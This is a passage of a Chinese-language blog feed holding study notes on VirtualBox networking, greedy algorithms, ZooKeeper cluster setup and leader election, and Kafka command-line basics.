class="line">address 192.168.100.3</span><br><span class="line">netmask 255.255.255.0</span><br></pre></td></tr></table></figure></li><li><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1></li></ul><p>win11 ping 虚拟机成功</p><p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224204049304.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224204049304.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224204049304"></p><p>ssh 连接 成功</p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224204111612.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224204111612.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224204111612" style="zoom:50%;"><p>虚拟机能正确上网</p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224204206968.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224204206968.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224204206968" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>算法：贪心、分治、回溯</title>
      <link href="/2021/12/24/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%EF%BC%9A%E8%B4%AA%E5%BF%83%E3%80%81%E5%88%86%E6%B2%BB%E3%80%81%E5%9B%9E%E6%BA%AF/"/>
      <url>/2021/12/24/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%EF%BC%9A%E8%B4%AA%E5%BF%83%E3%80%81%E5%88%86%E6%B2%BB%E3%80%81%E5%9B%9E%E6%BA%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-贪心算法"><a href="#一、-贪心算法" class="headerlink" title="一、 贪心算法"></a>一、 贪心算法</h1><ul><li>第一步，套用贪心算法模型，针对一组数据，事先定义了<strong>限制值和期望值</strong>，希望从中选出几个数据，在满足期望值的情况下，期望值最大。</li><li>第二步，尝试用贪心算法来解决。每次选中对<strong>限制值</strong>同等贡献量的情况下，对<strong>期望值</strong>贡献最大的数据。</li><li>第三步，举例验证算法是否正确，在大部分情况下，举几个例子验证一下算法是否能得到<strong>最优解</strong>。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>算法：动态规划总结</title>
      <link href="/2021/12/24/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%EF%BC%9A%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/24/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%EF%BC%9A%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<hr><hr><h1 id="1-搭建集群"><a href="#1-搭建集群" class="headerlink" title="1.搭建集群"></a>1.搭建集群</h1><ul><li><strong>先创建4个持久化目录，并且在每个目录下标记一个myid</strong></li></ul><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225144329001.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225144329001.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225144329001" style="zoom:50%;"><p>其中分别zk1 zk2 zk3 zk4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; ./zk1/myid</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; ./zk2/myid</span><br><span class="line"><span class="built_in">echo</span> 3 &gt; ./zk3/myid</span><br><span class="line"><span class="built_in">echo</span> 4 &gt; ./zk4/myid</span><br></pre></td></tr></table></figure><ul><li><strong>创建zoo1.cfg/zoo2.cfg/zoo3.cfg/zoo4.cfg</strong></li></ul><p>修改端口以及添加sever，比如server.1中2001为集群中通信的端口，3001为选举的端口</p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225144857684.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225144857684.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225144857684" style="zoom: 80%;"><p>其中zoo1.cfg中clientPort为2181，zoo2cfg中clientPort为2182····</p><p>并且将其中各自的持久化目录dataDir修改为刚才对应下面的zk1/zk2/zk3/zk4</p><ul><li><strong>启动集群</strong></li></ul><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225145605217.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225145605217.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225145605217" style="zoom:67%;"><ul><li><strong>查看集群角色</strong></li></ul><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225145649112.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225145649112.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225145649112" style="zoom: 80%;"><p>可以看到其中第二个节点被选举为leader</p><h1 id="2-连接集群"><a href="#2-连接集群" class="headerlink" title="2.连接集群"></a>2.连接集群</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli.sh -server 192.168.100.10:2181,192.168.100.10:2182,192.168.100.10:2183</span><br></pre></td></tr></table></figure><h1 id="3-集群选举"><a href="#3-集群选举" class="headerlink" title="3.集群选举"></a>3.集群选举</h1><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225152704079.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225152704079.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225152704079" style="zoom:67%;"><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225151134285.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225151134285.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225151134285"></p><h2 id="假设集群有两台服务器"><a href="#假设集群有两台服务器" class="headerlink" title="假设集群有两台服务器"></a>假设集群有两台服务器</h2><h3 id="1-发送各自的选票"><a href="#1-发送各自的选票" class="headerlink" title="1.发送各自的选票"></a>1.发送各自的选票</h3><p>首选两台服务器将(myid，zXid)；zXid为事务id，其中增删改查越频繁，事务id越大；</p><h3 id="2-比对选票"><a href="#2-比对选票" class="headerlink" title="2.比对选票"></a>2.比对选票</h3><p>其中先比较事务id，事务id越大的话投出去，次之以myid为标准</p><p>经过前面两个步骤投票箱中有一张节点2的选票，由于配置文件中已经有写进了三台服务器节点，所以需要票数超一半才能被选为leader</p><h3 id="3-将手中权重最大的选票继续共享，投票"><a href="#3-将手中权重最大的选票继续共享，投票" class="headerlink" title="3.将手中权重最大的选票继续共享，投票"></a>3.将手中权重最大的选票继续共享，投票</h3><p>所以此时投票箱中有两张节点2的选票，节点2被选中为leader</p><h3 id="4-新加入的节点发现集群中有leader，自动将自己添加为follower"><a href="#4-新加入的节点发现集群中有leader，自动将自己添加为follower" class="headerlink" title="4.新加入的节点发现集群中有leader，自动将自己添加为follower"></a>4.新加入的节点发现集群中有leader，自动将自己添加为follower</h3><h2 id="崩溃恢复选举状态"><a href="#崩溃恢复选举状态" class="headerlink" title="崩溃恢复选举状态"></a>崩溃恢复选举状态</h2><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225152521025.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225152521025.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225152521025" style="zoom:67%;"><h1 id="4-主从服务数据同步（两阶段同步）"><a href="#4-主从服务数据同步（两阶段同步）" class="headerlink" title="4.主从服务数据同步（两阶段同步）"></a>4.主从服务数据同步（两阶段同步）</h1><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225153409633.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225153409633.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225153409633"></p><p>1.先写到数据文件（硬盘中），发送ACK</p><p>2.半数以上的ACK后leader发送commit写到内存中</p><h1 id="5-CAP理论"><a href="#5-CAP理论" class="headerlink" title="5.CAP理论"></a>5.CAP理论</h1><p>一个分布式系统最多只能满足一致性、可用性、分区容错性中的两项<br><strong>一致性（Consistency）</strong><br><strong>可用性（Avaiability）</strong>正常的响应时间<br><strong>分区容错性（Partition tolerance）</strong>分布式系统在遇到某节点或网络分区故障时，仍然能够对外提供满足一致性或可用性的服务。避免单节点故障，就要进冗余部署，冗余部署相当于服务的分区，这样的分区就具备了容错性。</p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225155435475.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/ZooKeeper%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225155435475.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225155435475" style="zoom:67%;"><p>zookeeper追求并不是强一致性，而是顺序一致性</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kafka：入门</title>
      <link href="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Kafka安装"><a href="#1-Kafka安装" class="headerlink" title="1.Kafka安装"></a>1.Kafka安装</h1><ul><li>需要jdk环境</li><li>配置server.properties</li><li>启动</li></ul><h1 id="2-topic"><a href="#2-topic" class="headerlink" title="2.topic"></a>2.topic</h1><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225170803200.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225170803200.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225170803200"></p><h1 id="3-创建topic"><a href="#3-创建topic" class="headerlink" title="3.创建topic"></a>3.创建topic</h1><ul><li>向kafka中创建一个test主题</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --create --zookeeper 192.168.100.10:2181 --replication-factor 1 --partitions 1 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><ul><li>查看主题</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --list --zookeeper 192.168.100.10:2181</span><br></pre></td></tr></table></figure><h1 id="4-发送消息"><a href="#4-发送消息" class="headerlink" title="4.发送消息"></a>4.发送消息</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-producer.sh --broker-list 192.168.100.20:9092 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225220555523.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225220555523.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225220555523"></p><h1 id="5-消费消息"><a href="#5-消费消息" class="headerlink" title="5.消费消息"></a>5.消费消息</h1><h3 id="1-从最新的消息开始消费-从最后一条-1"><a href="#1-从最新的消息开始消费-从最后一条-1" class="headerlink" title="1.从最新的消息开始消费(从最后一条+1)"></a>1.从最新的消息开始消费(从最后一条+1)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092 --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225220605328.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225220605328.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225220605328"></p><h3 id="2-从头开始消费"><a href="#2-从头开始消费" class="headerlink" title="2.从头开始消费"></a>2.从头开始消费</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092 --from-beginning  --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225222038068.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225222038068.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225222038068"></p><p>生产者将消息发送给broker，broker会将消息保存在本地的日志文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/日志文件/主题-分区/00000.log</span><br></pre></td></tr></table></figure><p>消息的保存是有序的，通过offset偏移量来描述消息的有序性<br>消费者消费消息时也是通过offset来描述当前要消费的那条消息的位置</p><h1 id="6-单播与多播"><a href="#6-单播与多播" class="headerlink" title="6.单播与多播"></a>6.单播与多播</h1><h3 id="单播"><a href="#单播" class="headerlink" title="单播"></a>单播</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092 --consumer-property group.id=testGroup --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="多播"><a href="#多播" class="headerlink" title="多播"></a>多播</h3><p>实际上就是单播的复杂使用，创建多个消费组即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092 --consumer-property group.id=testGroup1 --topic test</span><br><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092 --consumer-property group.id=testGroup2 --topic test</span><br></pre></td></tr></table></figure><p>对于上面的命令每个消费组都能收到消息，但是同个消费组是属于单播的，实际上也就是只有一个消费者在同一个消费组去竞争消息</p><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225223451878.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225223451878.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225223451878"></p><h1 id="6-查看消费组的详细信息"><a href="#6-查看消费组的详细信息" class="headerlink" title="6.查看消费组的详细信息"></a>6.查看消费组的详细信息</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./kafka-consumer-groups.sh --bootstrap-server 192.168.100.20:9092 --list</span><br><span class="line">./kafka-consumer-groups.sh --bootstrap-server 192.168.100.20:9092 --describe --group testGroup(消费组名称)</span><br></pre></td></tr></table></figure><p><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225223948259.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225223948259.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225223948259"></p><h1 id="7-主题与分区"><a href="#7-主题与分区" class="headerlink" title="7.主题与分区"></a>7.主题与分区</h1><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>一个逻辑概念</p><h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225224357317.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225224357317.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225224357317" style="zoom:67%;"><p><strong>通过partition将一个topic中的消息分区来存储，好处：</strong></p><ul><li>提升了读写的吞吐量，读和写可以同时在多个分区中进行</li><li>分区存储，解决统一存储文件过大的问题</li></ul><h3 id="kafka消息日志存放的内容"><a href="#kafka消息日志存放的内容" class="headerlink" title="kafka消息日志存放的内容"></a>kafka消息日志存放的内容</h3><ul><li>000000.log这个文件中保存就是消息</li><li>consumer_offsets-49:<pre><code>kafka内部创建了_consumer_offsets主题包含了50个分区，这个主题用来存放消费者消费某个主题的偏移量。因为每个消费者都会维护着消费的主题的偏移量，也就是说每个消费者会把消费的主题的偏移量自主上报给kafka中的默认主题：**consum_offsets**。因此kafka为了提升该主题并发性，默认设置了50个分区</code></pre><ul><li>提交到那个分区：通过hash函数：hash(consumerGroupId)%__consumer_offsets主题的分区数</li><li>提交到的该主题的内容：key是consumerGroup+topic+分区号，value就是当前offset的值</li></ul></li></ul><img src="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225230331387.png" class="lazyload" data-srcset="/2021/12/24/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/Kafka%EF%BC%9A%E5%85%A5%E9%97%A8/image-20211225230331387.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211225230331387" style="zoom:50%;">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-并发：头歌题目</title>
      <link href="/2021/12/23/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E5%A4%B4%E6%AD%8C%E9%A2%98%E7%9B%AE/"/>
      <url>/2021/12/23/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E5%A4%B4%E6%AD%8C%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习：波士顿房价预测</title>
      <link href="/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/12/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E6%B3%A2%E5%A3%AB%E9%A1%BF%E6%88%BF%E4%BB%B7%E9%A2%84%E6%B5%8B/</url>
      
